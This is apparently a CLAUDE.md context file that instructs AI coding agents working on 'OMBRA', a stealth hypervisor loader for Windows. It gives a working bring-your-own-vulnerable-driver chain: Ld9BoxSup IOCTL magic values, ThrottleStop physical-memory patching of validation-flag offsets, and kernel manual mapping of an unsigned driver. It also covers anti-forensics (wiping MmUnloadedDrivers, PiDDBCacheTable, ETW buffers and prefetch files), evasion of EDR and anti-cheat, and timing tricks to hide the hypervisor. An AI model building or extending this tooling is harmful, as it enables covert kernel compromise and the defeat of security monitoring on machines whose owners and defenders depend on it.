# Usermode Component - Developer Context

This CLAUDE.md provides usermode-specific context for the OMBRA hypervisor project. See root `/CLAUDE.MD` for ENI identity, project-wide conventions, and MCP tool usage.

## Quick Stats

| Metric | Value |
|--------|-------|
| **Components** | BYOVD Exploit + PE Mapper + GUI + Tests |
| **Language** | C (MSVC) + Dear ImGui (C++) |
| **Primary Output** | `loader.exe` |
| **GUI Framework** | Dear ImGui 1.90+ (Win32/DirectX) |
| **Build** | `hypervisor/build/build.bat` |

---

## Directory Structure

```
hypervisor/usermode/
├── main.c                    # Application entry point (~14KB)
├── loader_api.c/h            # Loader API interface (~20KB/~10KB)
├── ombra_client.c/h          # Client communication (~29KB/~11KB)
├── driver_interface.c/h      # Driver communication (~19KB/~5KB)
├── payload_loader.c/h        # Payload loading (~13KB/~2.5KB)
├── debug_reader.c/h          # Debug output (~6.5KB/~3.5KB)
├── ld9boxsup.h               # Ld9BoxSup IOCTL definitions (~14KB)
├── ombra.h                   # Main header (~17KB)
├── obfuscate.h               # String obfuscation (~7KB)
├── byovd/                    # BYOVD exploitation subsystem
│   ├── supdrv.c/h            # Ld9BoxSup.sys interface
│   ├── supdrv_types.h        # IOCTL structures + magic values
│   ├── throttlestop.c/h      # ThrottleStop physical memory R/W
│   ├── deployer.c/h          # Driver deployment + cleanup
│   ├── crypto.c/h            # Driver decryption
│   ├── nt_helpers.c          # NT API wrappers
│   ├── nt_defs.h             # NT structures
│   └── types.h               # Common types
├── loader/                   # PE Manual Mapping subsystem
│   ├── hv_loader.c/h         # Hypervisor loading orchestration
│   ├── pe_parser.c/h         # PE header parsing (DOS/NT/sections)
│   ├── pe_mapper.c/h         # Memory mapping + section loading
│   ├── pe_relocs.c/h         # Relocation processing
│   ├── pe_iat.c/h            # Import Address Table resolution
│   ├── pe_imports.c/h        # Import table handling
│   ├── pe_utils.c/h          # PE utilities
│   ├── pe_wipe.c/h           # PE header wiping (anti-forensics)
│   └── drv_loader.c/h        # Driver loading
├── tests/                    # Detection testing
│   ├── bigpool_test.c/h      # BigPool visibility test
│   ├── bigpool_test_kernel.c # Kernel-side BigPool test
│   ├── detection_baseline.c/h # Timing baseline
│   └── test_framework.c/h    # Test harness
└── gui/                      # Dear ImGui (vendored)
    └── imgui/                # ImGui 1.90+ source
```

---

## BYOVD Exploitation Chain (Ld9BoxSup.sys)

### Two-Driver Architecture

PROJECT-OMBRA uses a dual-driver BYOVD chain to achieve kernel code execution:

| Driver | Purpose | Capabilities | Window |
|--------|---------|--------------|--------|
| **Ld9BoxSup.sys** | LDPlayer VirtualBox fork | Kernel code loading via IOCTLs | Persistent (signed) |
| **ThrottleStop** | CPU tuning utility | Physical memory R/W | ~10-15ms (transient) |

**Why Two Drivers?**

Ld9BoxSup.sys alone can load kernel code via `SUP_IOCTL_LDR_LOAD`, but in nested virtualization environments it returns **-618** (module enumeration failure). ThrottleStop is used to patch validation flags via physical memory, bypassing this check.

### Ld9BoxSup.sys Critical Values (Verified Dec 2025)

**Authentication:**

| Value | Type | Description | Location |
|-------|------|-------------|----------|
| `0x69726F74` | DWORD | Initial cookie ("tori" - NOT stock VBox "Bori") | Header magic |
| `"The Magic Word!"` | String | Auth magic string | Offset `0x36d58` |
| `0x42000042` | DWORD | Required header flags | IOCTL header |
| `0x320000` | DWORD | Driver version | IOCTL header |

**Validation Flags (Physical Memory Offsets):**

| Symbol | Offset | Description |
|--------|--------|-------------|
| `g_fSUPR0NtVerifyAllowed` | `0x4a1a0` | ntoskrnl validation flag |
| `g_fSUPR0HalVerifyAllowed` | `0x4a210` | hal validation flag |

**IOCTL Buffer Sizes:**

| IOCTL | Input Size | Output Size |
|-------|------------|-------------|
| `SUP_IOCTL_COOKIE` | 48 bytes | 56 bytes |
| `SUP_IOCTL_LDR_OPEN` | 328 bytes | 40 bytes |
| `SUP_IOCTL_LDR_LOAD` | Variable | Variable |

### Key IOCTLs

#### 1. SUP_IOCTL_COOKIE - Session Establishment

**Purpose:** Authenticate and establish session (REQUIRED first)

**Structure:**
```c
typedef struct {
    ULONG magic;          // 0x69726F74
    ULONG version;        // 0x320000
    ULONG flags;          // 0x42000042
    char magic_word[16];  // "The Magic Word!"
    // ... session fields
} SUP_IOCTL_COOKIE_IN;
```

**Returns:** Session cookie + driver capabilities

#### 2. SUP_IOCTL_LDR_OPEN - Allocate Kernel Memory

**Purpose:** Allocate executable kernel memory for payload

**Input:**
```c
typedef struct {
    SIZE_T image_size;     // Payload size in bytes
    ULONG flags;           // Memory protection flags
    // ... header fields
} SUP_IOCTL_LDR_OPEN_IN;
```

**Returns:**
- Kernel virtual address (KVA) of allocated memory
- Image handle for subsequent operations

**Error -618:** Module enumeration failed (nested virt detection). Requires ThrottleStop bypass.

#### 3. SUP_IOCTL_LDR_LOAD - Copy Code + Execute

**Purpose:** Copy payload to allocated memory and call entry point (Ring-0 execution!)

**Input:**
```c
typedef struct {
    PVOID image_handle;    // From LDR_OPEN
    PVOID user_buffer;     // Payload bytes
    SIZE_T buffer_size;    // Payload size
    PVOID entry_point;     // KVA of entry function
    // ... relocation data
} SUP_IOCTL_LDR_LOAD_IN;
```

**Returns:** Entry point return value

**CRITICAL:** Payload executes at IRQL PASSIVE_LEVEL in system process context.

#### 4. SUP_IOCTL_MSR_PROBER - MSR Access (DISABLED)

**Status:** DISABLED in Ld9BoxSup build (returns -12)

**Original Purpose:** Read/write MSRs from usermode

### -618 Bypass Process (ThrottleStop)

**Problem:** Ld9BoxSup.sys checks module enumeration integrity. In nested virt, this fails → -618.

**Solution:** Use ThrottleStop to patch validation flags via physical memory.

#### Step-by-Step Bypass:

```
1. Load ThrottleStop driver
   └─> Provides MmCopyMemory-like physical memory R/W

2. Scan physical memory range 0x1a2000-0x1b0000 for SYSTEM EPROCESS
   ├─> Search for "System" unicode string
   └─> Validate EPROCESS structure signature

3. Read CR3 from DirectoryTableBase (EPROCESS+0x28)
   └─> Page table base for kernel address space

4. Walk page tables to translate flag virtual addresses to physical
   ├─> Parse PML4E → PDPTE → PDE → PTE
   └─> Extract physical frame number (PFN) + page offset

5. Write 0x01 to both validation flag physical addresses
   ├─> g_fSUPR0NtVerifyAllowed (0x4a1a0) → phys addr
   └─> g_fSUPR0HalVerifyAllowed (0x4a210) → phys addr

6. Unload ThrottleStop driver (~10-15ms window)
   └─> Minimize detection surface

7. Ld9BoxSup LDR_OPEN now succeeds
   └─> Validation checks pass (flags = 0x01)
```

**Timing Window:** ThrottleStop should be loaded/unloaded in <15ms to minimize EDR/anti-cheat detection.

### Post-Exploitation Cleanup (from Ring-0)

Once hypervisor payload executes in kernel context, perform anti-forensics cleanup:

#### 1. MmUnloadedDrivers List Cleanup

**Target:** `ntoskrnl!MmUnloadedDrivers` linked list

```c
// Pseudo-code
typedef struct {
    UNICODE_STRING name;
    PVOID start_address;
    PVOID end_address;
    LARGE_INTEGER unload_time;
} UNLOADED_DRIVER;

// Remove our entry
for (entry in MmUnloadedDrivers) {
    if (entry.name contains "Ld9BoxSup" or "ThrottleStop") {
        remove_from_list(entry);
        zero_memory(&entry, sizeof(entry));
    }
}
```

**Detection Vector Mitigated:** Driver enumeration via `NtQuerySystemInformation(SystemModuleInformation)`

#### 2. PiDDBCacheTable Hash Bucket Cleanup

**Target:** `ntoskrnl!PiDDBCacheTable` (Driver Database Cache)

```c
// Hash bucket traversal
HASH_BUCKET* bucket = PiDDBCacheTable[hash("Ld9BoxSup.sys")];
for (entry in bucket) {
    if (entry.driver_name == "Ld9BoxSup.sys" || "ThrottleStop.sys") {
        remove_from_bucket(entry);
        free_pool(entry);
    }
}
```

**Detection Vector Mitigated:** Driver signature validation bypass artifacts

#### 3. ETW Circular Buffer Wipe

**Target:** `ntoskrnl!EtwpLoggerContext` circular buffers

```c
// Wipe events in timestamp window
LARGE_INTEGER load_time = get_driver_load_time();
wipe_etw_events_in_window(
    load_time - 5_seconds,
    load_time + 5_seconds
);
```

**Detection Vector Mitigated:** ETW driver load events (`Microsoft-Windows-Kernel-PnP`)

#### 4. Prefetch File Deletion

**Target:** `C:\Windows\Prefetch\LD9BOXSUP.SYS-*.pf` and `THROTTLESTOP.SYS-*.pf`

```c
// From usermode after kernel cleanup
DeleteFileW(L"C:\\Windows\\Prefetch\\LD9BOXSUP.SYS-*.pf");
DeleteFileW(L"C:\\Windows\\Prefetch\\THROTTLESTOP.SYS-*.pf");
```

**Detection Vector Mitigated:** Forensic analysis via Windows Prefetch

### BYOVD Implementation Files

| File | Purpose | Key Functions |
|------|---------|---------------|
| `supdrv.c` | Ld9BoxSup IOCTL interface | `supdrv_cookie()`, `supdrv_ldr_open()`, `supdrv_ldr_load()` |
| `supdrv_types.h` | IOCTL structures + magic values | Cookie struct, buffer layouts |
| `throttlestop.c` | ThrottleStop phys mem R/W | `ts_read_phys()`, `ts_write_phys()` |
| `deployer.c` | Driver deployment logic | `deploy_driver()`, `load_driver()`, `unload_driver()` |
| `crypto.c` | Driver decryption | `decrypt_driver()` (embedded resources) |
| `nt_helpers.c` | NT API wrappers | `nt_load_driver()`, `nt_unload_driver()` |

### Security Considerations

#### Detection Risks:

| Vector | Risk Level | Mitigation |
|--------|------------|------------|
| Driver signature blocklist | **CRITICAL** | Use obfuscated/modified binaries |
| BigPool scan | **HIGH** | Ld9BoxSup allocates from NonPagedPool, visible in BigPool |
| ETW driver load events | **HIGH** | Wipe ETW buffers post-load |
| PML4E scan | **HIGH** | Kernel memory allocated by Ld9BoxSup visible in page tables |
| Prefetch artifacts | **MEDIUM** | Delete `.pf` files post-cleanup |
| ThrottleStop timing window | **MEDIUM** | Minimize load/unload time (<15ms) |

#### Anti-Detection Strategy:

1. **Rename Drivers:** Never use stock filenames (`Ld9BoxSup.sys` → `<random>.sys`)
2. **Modify PE Headers:** Randomize timestamps, version info, resource hashes
3. **Encrypt Embedded Drivers:** Store drivers as encrypted resources in `loader.exe`
4. **Fast Unload:** ThrottleStop should be unloaded ASAP after patching flags
5. **EPT Hiding:** Once hypervisor is loaded, use EPT to hide kernel allocations from PML4E scans

---

## PE Manual Mapping Implementation

Manual mapping is the process of loading a PE (Portable Executable) file into memory without using `LoadLibrary`, avoiding kernel driver loader artifacts.

### Why Manual Mapping?

| Standard Loading (Service Control Manager) | Manual Mapping (BYOVD) |
|---------------------------------------------|------------------------|
| Creates registry keys (`HKLM\System\CurrentControlSet\Services`) | No registry artifacts |
| Logged in ETW (`Microsoft-Windows-Kernel-PnP`) | No PnP events |
| Appears in `ZwQuerySystemInformation(SystemModuleInformation)` | Hidden from module enumeration |
| Requires admin + DSE bypass | Uses BYOVD for kernel loading |

**Use Case:** Load hypervisor driver into kernel memory via Ld9BoxSup without Windows driver loader.

### PE Loading Pipeline

```
PE File (disk)
    ↓
1. PE Parser → Validate headers, parse sections
    ↓
2. Memory Allocation → Allocate kernel memory via Ld9BoxSup LDR_OPEN
    ↓
3. Section Mapping → Copy sections to allocated memory (RVA → VA)
    ↓
4. Relocations → Apply base relocations (.reloc section)
    ↓
5. Import Resolution → Resolve imports (IAT patching)
    ↓
6. Header Wiping → Zero DOS/NT headers (anti-forensics)
    ↓
7. Entry Point → Call DriverEntry via Ld9BoxSup LDR_LOAD
```

### Implementation Files

| File | Purpose | Key Functions |
|------|---------|---------------|
| `pe_parser.c` | Parse PE headers | `pe_parse_dos()`, `pe_parse_nt()`, `pe_get_sections()` |
| `pe_mapper.c` | Map PE to memory | `pe_map_image()`, `pe_map_sections()` |
| `pe_relocs.c` | Apply relocations | `pe_process_relocs()`, `pe_apply_reloc_block()` |
| `pe_iat.c` | Patch IAT | `pe_resolve_iat()`, `pe_write_iat_entry()` |
| `pe_imports.c` | Resolve imports | `pe_get_exports()`, `pe_find_export()` |
| `pe_utils.c` | PE utilities | `pe_rva_to_va()`, `pe_validate_header()` |
| `pe_wipe.c` | Header wiping | `pe_wipe_headers()`, `pe_wipe_dos_stub()` |
| `hv_loader.c` | Hypervisor orchestration | `hv_load()`, `hv_map_and_inject()` |
| `drv_loader.c` | Generic driver loading | `drv_load()`, `drv_map_kernel()` |

### 1. PE Parsing (`pe_parser.c`)

**Goal:** Validate PE file structure and extract metadata.

```c
// Parse DOS header
IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)file_base;
if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
    return ERROR_INVALID_PE;
}

// Parse NT headers
IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(file_base + dos->e_lfanew);
if (nt->Signature != IMAGE_NT_SIGNATURE) {
    return ERROR_INVALID_PE;
}

// Extract sections
IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    // Store section info: VirtualAddress, SizeOfRawData, Characteristics
}
```

**Validation Checks:**
- DOS signature (`MZ` / `0x5A4D`)
- NT signature (`PE\0\0` / `0x00004550`)
- Optional header magic (`0x020B` for PE32+)
- Section alignment (typically 0x1000)

### 2. Memory Allocation (`hv_loader.c`)

**Goal:** Allocate kernel memory via Ld9BoxSup for mapped image.

```c
// Calculate total image size (aligned)
SIZE_T image_size = ALIGN_UP(nt->OptionalHeader.SizeOfImage, 0x1000);

// Allocate via Ld9BoxSup LDR_OPEN
PVOID kernel_base = supdrv_ldr_open(image_size);
if (!kernel_base) {
    return ERROR_ALLOCATION_FAILED;
}
```

**Alignment:** Must match `OptionalHeader.SectionAlignment` (usually 4KB/0x1000).

### 3. Section Mapping (`pe_mapper.c`)

**Goal:** Copy sections from PE file to allocated kernel memory.

```c
for (i = 0; i < section_count; i++) {
    IMAGE_SECTION_HEADER* section = &sections[i];

    // Calculate addresses
    PVOID dest = kernel_base + section->VirtualAddress;
    PVOID src = file_base + section->PointerToRawData;
    SIZE_T size = min(section->SizeOfRawData, section->Misc.VirtualSize);

    // Copy section data
    memcpy(dest, src, size);

    // Zero-fill remaining virtual size (BSS section)
    if (section->Misc.VirtualSize > section->SizeOfRawData) {
        SIZE_T zero_size = section->Misc.VirtualSize - section->SizeOfRawData;
        memset(dest + size, 0, zero_size);
    }
}
```

**Key Sections:**
- `.text` - Executable code
- `.data` - Initialized data
- `.rdata` - Read-only data (imports, exports)
- `.reloc` - Base relocation table
- `.bss` - Uninitialized data (zero-filled)

### 4. Relocation Processing (`pe_relocs.c`)

**Goal:** Adjust absolute addresses when image loads at different base than PE ImageBase.

**Why Relocations?**

PE files have a preferred `ImageBase` (e.g., `0x140000000`). If loaded at different address, all absolute pointers must be adjusted by delta.

```c
// Calculate relocation delta
UINT64 delta = (UINT64)kernel_base - nt->OptionalHeader.ImageBase;

// Parse relocation directory
IMAGE_DATA_DIRECTORY* reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
IMAGE_BASE_RELOCATION* reloc_block = (IMAGE_BASE_RELOCATION*)(kernel_base + reloc_dir->VirtualAddress);

// Process each relocation block
while (reloc_block->SizeOfBlock > 0) {
    DWORD entry_count = (reloc_block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
    WORD* entries = (WORD*)(reloc_block + 1);

    for (i = 0; i < entry_count; i++) {
        WORD type = entries[i] >> 12;
        WORD offset = entries[i] & 0xFFF;

        if (type == IMAGE_REL_BASED_DIR64) {
            UINT64* patch_addr = (UINT64*)(kernel_base + reloc_block->VirtualAddress + offset);
            *patch_addr += delta;
        }
    }

    reloc_block = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc_block + reloc_block->SizeOfBlock);
}
```

**Relocation Types:**
- `IMAGE_REL_BASED_DIR64` (10) - 64-bit absolute pointer (most common)
- `IMAGE_REL_BASED_HIGHLOW` (3) - 32-bit absolute pointer
- `IMAGE_REL_BASED_ABSOLUTE` (0) - Padding entry (skip)

### 5. Import Resolution (`pe_iat.c` + `pe_imports.c`)

**Goal:** Resolve imported functions (e.g., `IoCreateDevice` from `ntoskrnl.exe`) and patch Import Address Table (IAT).

#### Step 1: Parse Import Descriptor Table

```c
IMAGE_DATA_DIRECTORY* import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
IMAGE_IMPORT_DESCRIPTOR* import_desc = (IMAGE_IMPORT_DESCRIPTOR*)(kernel_base + import_dir->VirtualAddress);

while (import_desc->Name != 0) {
    char* module_name = (char*)(kernel_base + import_desc->Name);

    // Get module base (ntoskrnl.exe, hal.dll, etc.)
    PVOID module_base = get_kernel_module(module_name);

    // Process import thunks
    IMAGE_THUNK_DATA64* thunk = (IMAGE_THUNK_DATA64*)(kernel_base + import_desc->OriginalFirstThunk);
    IMAGE_THUNK_DATA64* iat_entry = (IMAGE_THUNK_DATA64*)(kernel_base + import_desc->FirstThunk);

    while (thunk->u1.AddressOfData != 0) {
        if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
            // Import by ordinal
            WORD ordinal = IMAGE_ORDINAL64(thunk->u1.Ordinal);
            iat_entry->u1.Function = (UINT64)get_export_by_ordinal(module_base, ordinal);
        } else {
            // Import by name
            IMAGE_IMPORT_BY_NAME* import_name = (IMAGE_IMPORT_BY_NAME*)(kernel_base + thunk->u1.AddressOfData);
            iat_entry->u1.Function = (UINT64)get_export_by_name(module_base, import_name->Name);
        }
        thunk++;
        iat_entry++;
    }

    import_desc++;
}
```

#### Step 2: Resolve Exports from Target Module

```c
// Get ntoskrnl.exe export directory
IMAGE_EXPORT_DIRECTORY* export_dir = get_export_directory(module_base);

// Search export name table
for (i = 0; i < export_dir->NumberOfNames; i++) {
    char* export_name = (char*)(module_base + name_table[i]);
    if (strcmp(export_name, target_name) == 0) {
        WORD ordinal = ordinal_table[i];
        DWORD function_rva = function_table[ordinal];
        return (PVOID)(module_base + function_rva);
    }
}
```

**Kernel Modules Resolved:**
- `ntoskrnl.exe` - Core kernel APIs (IoXxx, KeXxx, MmXxx, etc.)
- `hal.dll` - Hardware Abstraction Layer
- `FLTMGR.SYS` - Filter Manager (if used)

**CRITICAL:** Import resolution must happen in kernel context (BYOVD payload), as module bases are kernel VAs.

### 6. Header Wiping (`pe_wipe.c`)

**Goal:** Zero DOS/NT headers and other PE artifacts to defeat memory forensics.

```c
// Wipe DOS header + stub
memset(kernel_base, 0, sizeof(IMAGE_DOS_HEADER) + 0x40);

// Wipe NT headers
IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(kernel_base + dos->e_lfanew);
memset(nt, 0, sizeof(IMAGE_NT_HEADERS64));

// Wipe section headers
IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
memset(sections, 0, section_count * sizeof(IMAGE_SECTION_HEADER));

// Optional: Wipe .reloc section (no longer needed after patching)
IMAGE_SECTION_HEADER* reloc_section = find_section(".reloc");
if (reloc_section) {
    memset(kernel_base + reloc_section->VirtualAddress, 0, reloc_section->Misc.VirtualSize);
}
```

**Why Wipe Headers?**

Memory scanning tools (e.g., Volatility, WinDbg) search for PE signatures:
- `MZ` DOS signature
- `PE\0\0` NT signature
- Section names (`.text`, `.data`)

Wiping headers breaks signature-based detection.

**Trade-offs:**
- Debugging becomes harder (no symbols)
- Crash dumps show corrupt module info
- Some kernel APIs rely on PE headers (e.g., `RtlImageNtHeader`)

### 7. Entry Point Execution (`hv_loader.c`)

**Goal:** Call `DriverEntry` with fake driver object.

```c
// Create fake DRIVER_OBJECT
DRIVER_OBJECT fake_driver = {0};
fake_driver.DriverStart = kernel_base;
fake_driver.DriverSize = image_size;

// Get entry point RVA
DWORD entry_rva = nt->OptionalHeader.AddressOfEntryPoint;
PVOID entry_point = kernel_base + entry_rva;

// Call DriverEntry via Ld9BoxSup LDR_LOAD
NTSTATUS status = supdrv_ldr_load(
    kernel_base,
    entry_point,
    &fake_driver,
    NULL  // RegistryPath
);
```

**DriverEntry Signature:**
```c
NTSTATUS DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
);
```

**Fake Driver Object Fields:**
- `DriverStart` - Image base address
- `DriverSize` - Total image size
- `DriverInit` - Entry point address
- `DriverUnload` - Unload routine (if provided)

---

## Detection Testing

### BigPool Visibility Test (`tests/bigpool_test.c`)

**Purpose:** Test if allocated kernel memory is visible via `NtQuerySystemInformation(SystemBigPoolInformation)`.

**Test Scenario:**
1. Allocate NonPagedPool memory via driver
2. Fill with known pattern (`0xDEADBEEF`)
3. Scan BigPool from usermode
4. Check if allocation appears in results

**Expected Results:**

| Allocation Method | Visible in BigPool? | Notes |
|-------------------|---------------------|-------|
| `ExAllocatePoolWithTag` | ✅ YES | Standard kernel allocation |
| `MmAllocateContiguousMemory` | ✅ YES | Physical contiguous allocation |
| Ld9BoxSup LDR_OPEN | ✅ YES | Uses NonPagedPool internally |
| MDL-based allocation | ❌ NO | Bypasses pool manager |

**Live Logging Feature (Dec 2025):**

```c
// Real-time status updates during test
log_test_status("Allocating 10MB test buffer...");
log_test_status("Scanning BigPool (this may take 30s)...");
log_test_status("Found allocation at offset 0x12345678");
```

**Key Files:**
- `bigpool_test.c` - Usermode test harness
- `bigpool_test_kernel.c` - Kernel-side allocation
- `test_framework.c` - Logging + result collection

**Detection Mitigation:**

BigPool scan is periodic (~20min). To evade:
1. Use EPT split-view to hide pages from memory scans
2. Avoid large allocations (>1MB)
3. Masquerade as legitimate driver pool tag

### Detection Baseline Test (`tests/detection_baseline.c`)

**Purpose:** Establish timing baseline for RDTSC-based detection.

**Test Scenarios:**

| Operation | Native Timing | HV Timing | Delta Threshold |
|-----------|---------------|-----------|-----------------|
| CPUID execution | ~20-50 cycles | ~500-2000 cycles | >500 = detected |
| RDTSC read | ~10-20 cycles | ~200-500 cycles | >200 = detected |
| CR3 access | ~30 cycles | ~1000 cycles | >500 = detected |
| MSR read | ~100 cycles | ~2000 cycles | >1000 = detected |

**Baseline Collection:**

```c
// Measure native timing
UINT64 start = __rdtsc();
__cpuid(0, 0);
UINT64 end = __rdtsc();
UINT64 native_cycles = end - start;

// Measure with hypervisor
enable_hypervisor();
start = __rdtsc();
__cpuid(0, 0);
end = __rdtsc();
UINT64 hv_cycles = end - start;

// Calculate delta
UINT64 delta = hv_cycles - native_cycles;
printf("CPUID delta: %llu cycles\n", delta);
```

**Anti-Detection Strategy:**

Use results to calibrate timing compensation in `hypervisor/timing.c`:

```c
// Apply TSC offset to hide VM-exit latency
vmcs_write(VMCS_TSC_OFFSET, -(INT64)measured_delta);
```

---

## GUI Integration (Dear ImGui)

**Framework:** Dear ImGui 1.90+ with Win32/DirectX backends

**Purpose:** Provide user-friendly interface for loader configuration and status monitoring.

**Key Features:**

| Feature | Implementation | File |
|---------|----------------|------|
| Driver status display | Live polling via driver IOCTL | `driver_interface.c` |
| BYOVD log output | Real-time kernel debug messages | `debug_reader.c` |
| Loader progress | Async loading with progress callbacks | `loader_api.c` |
| Configuration UI | ImGui widgets (sliders, checkboxes, text inputs) | `gui/` |

**Integration Pattern:**

```c
// Main loop (main.c)
while (!should_exit) {
    // Poll Win32 messages
    MSG msg;
    while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Start ImGui frame
    ImGui_ImplDX11_NewFrame();
    ImGui_ImplWin32_NewFrame();
    ImGui::NewFrame();

    // Render UI
    render_main_window();
    render_debug_console();
    render_status_bar();

    // End frame
    ImGui::Render();
    ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
}
```

**UI Components:**

```c
// Main window
ImGui::Begin("OMBRA Loader");
ImGui::Text("Status: %s", get_loader_status());
if (ImGui::Button("Load Hypervisor")) {
    async_load_hypervisor();
}
ImGui::ProgressBar(get_load_progress(), ImVec2(-1, 0));
ImGui::End();

// Debug console
ImGui::Begin("Debug Output");
for (auto& msg : debug_messages) {
    ImGui::TextColored(msg.color, "%s", msg.text);
}
ImGui::End();
```

**Font Resources:**

ImGui requires font files. Ensure `gui/imgui/misc/fonts/` contains:
- `Roboto-Regular.ttf` (default UI font)
- `DroidSans.ttf` (fallback)

**Build Note:** ImGui is C++, rest of usermode is C. Build script links C++ runtime.

---

## Build Instructions (Usermode)

### Building loader.exe

```batch
cd hypervisor\build
build.bat
```

**Build Process:**

1. Compile C files with MSVC:
   ```batch
   cl.exe /c /W3 /O2 /Zi main.c loader_api.c ombra_client.c driver_interface.c
   cl.exe /c /W3 /O2 /Zi byovd\*.c loader\*.c tests\*.c
   ```

2. Compile ImGui (C++):
   ```batch
   cl.exe /c /W3 /O2 /Zi /TP gui\imgui\*.cpp
   ```

3. Link executable:
   ```batch
   link.exe /OUT:loader.exe /DEBUG main.obj loader_api.obj ... imgui.obj
       /SUBSYSTEM:WINDOWS
       kernel32.lib user32.lib gdi32.lib d3d11.lib
   ```

**Output:** `hypervisor/build/loader.exe`

### Embedding Encrypted Drivers

Drivers are embedded as resources to avoid disk artifacts:

```rc
// loader.rc
IDR_LD9BOXSUP_ENCRYPTED RCDATA "resources/ld9boxsup.sys.enc"
IDR_THROTTLESTOP_ENCRYPTED RCDATA "resources/throttlestop.sys.enc"
```

**Decryption at Runtime:**

```c
// crypto.c
HRSRC res = FindResource(NULL, MAKEINTRESOURCE(IDR_LD9BOXSUP_ENCRYPTED), RT_RCDATA);
HGLOBAL res_data = LoadResource(NULL, res);
BYTE* encrypted = (BYTE*)LockResource(res_data);
SIZE_T size = SizeofResource(NULL, res);

// Decrypt with XOR + AES
BYTE* decrypted = decrypt_driver(encrypted, size, key);
```

**Anti-Forensics Benefit:** No `.sys` files on disk.

---

## OmbraMCP Tool Integration

Use these MCP tools when working on usermode loader/BYOVD code:

| Task | MCP Tool | Example |
|------|----------|---------|
| BYOVD IOCTL reference | `ld9boxsup_ioctl_guide` | `{"operation": "ldr_open"}` |
| PE parsing guide | `get_pe_parsing_guide` | N/A |
| Import resolution | `get_import_resolution_guide` | N/A |
| Relocation processing | `get_relocation_guide` | N/A |
| Memory allocation | `get_memory_allocation_guide` | N/A |
| Cleanup procedures | `get_cleanup_guide` | N/A |
| Driver wrapper generation | `generate_driver_wrapper` | N/A |
| Hypervisor loader | `generate_hypervisor_loader` | N/A |
| Binary validation | `validate_driver_binary` | `{"path": "driver.sys"}` |
| Mapping checklist | `generate_mapping_checklist` | N/A |

**Example Workflow:**

```bash
# Before implementing new BYOVD IOCTL
mcp-cli info ombra/ld9boxsup_ioctl_guide
mcp-cli call ombra/ld9boxsup_ioctl_guide '{"operation": "ldr_load"}'

# Generate PE mapping code
mcp-cli call ombra/get_pe_parsing_guide '{}'

# Validate driver binary before mapping
mcp-cli call ombra/validate_driver_binary '{"path": "hypervisor.sys"}'

# Generate cleanup checklist
mcp-cli call ombra/get_cleanup_guide '{}'
```

---

## Known Issues / Gotchas

### 1. Ld9BoxSup -618 Error

**Problem:** `SUP_IOCTL_LDR_OPEN` returns -618 in nested virtualization.

**Cause:** Module enumeration check fails when running inside VMware/VirtualBox.

**Solution:** Use ThrottleStop bypass (see BYOVD section above).

### 2. Import Resolution Deadlock

**Problem:** Resolving imports from kernel modules can deadlock if module loader lock is held.

**Cause:** Ld9BoxSup executes payload at PASSIVE_LEVEL, but module loader may be locked.

**Solution:** Use lazy import resolution - resolve on first use, not during mapping.

### 3. PE Header Integrity Checks

**Problem:** Some kernel APIs (`RtlImageNtHeader`, `MmGetSystemRoutineAddress`) require valid PE headers.

**Cause:** `pe_wipe.c` zeros headers for stealth.

**Trade-off:** Keep minimal headers (DOS + NT signature) if using these APIs, OR resolve all imports before wiping.

### 4. Large Allocations in BigPool

**Problem:** Allocations >1MB appear in `NtQuerySystemInformation(SystemBigPoolInformation)`.

**Cause:** Ld9BoxSup uses `ExAllocatePoolWithTag` internally.

**Solution:** Use EPT to hide pages from memory scans, or split into smaller allocations.

### 5. ThrottleStop Detection Window

**Problem:** ThrottleStop loaded/unloaded leaves temporal artifacts in ETW.

**Cause:** ETW logs driver load events with microsecond timestamps.

**Solution:** Wipe ETW circular buffers IMMEDIATELY after ThrottleStop unload (see cleanup section).

---

## File Size Reference

| Component | Total Size | Notes |
|-----------|------------|-------|
| BYOVD subsystem | ~15-20KB | 12 files (supdrv, throttlestop, deployer, crypto) |
| PE Mapper subsystem | ~25-30KB | 14 files (parser, mapper, relocs, IAT, etc.) |
| Tests | ~10KB | BigPool test + detection baseline |
| GUI (ImGui) | ~500KB | Vendored library (not included in LOC count) |
| Main/API/Client | ~65KB | Core loader logic |

---

## Summary

The usermode component is responsible for:

1. **BYOVD Exploitation** - Loading kernel code via Ld9BoxSup.sys + ThrottleStop bypass
2. **PE Manual Mapping** - Mapping hypervisor driver into kernel without Windows loader
3. **Anti-Forensics Cleanup** - Removing driver artifacts (MmUnloadedDrivers, PiDDB, ETW, Prefetch)
4. **Detection Testing** - BigPool visibility + timing baseline tests
5. **GUI** - User-friendly interface for configuration and monitoring

**Critical Files to Understand:**
- `byovd/supdrv.c` - Ld9BoxSup IOCTL interface (kernel code execution)
- `byovd/throttlestop.c` - Physical memory R/W for -618 bypass
- `loader/pe_mapper.c` - Core PE mapping logic
- `loader/pe_iat.c` - Import resolution (most complex)
- `main.c` - Application orchestration

**Detection Risk Areas:**
- BigPool allocations (visible via NtQuerySystemInformation)
- PML4E scans (kernel pages visible in page tables)
- ETW driver load events (requires post-load cleanup)
- Timing deltas (CPUID/RDTSC must be compensated)

**Next Steps for Subagents:**

When working on usermode code:
1. Use `ld9boxsup_ioctl_guide` MCP tool for IOCTL reference
2. Use `get_pe_parsing_guide` for PE implementation details
3. Test allocations with `bigpool_test.c` before deploying
4. Always run `get_cleanup_guide` after adding new BYOVD features

---

*See `/CLAUDE.MD` for ENI identity, code quality standards, and MCP usage patterns.*
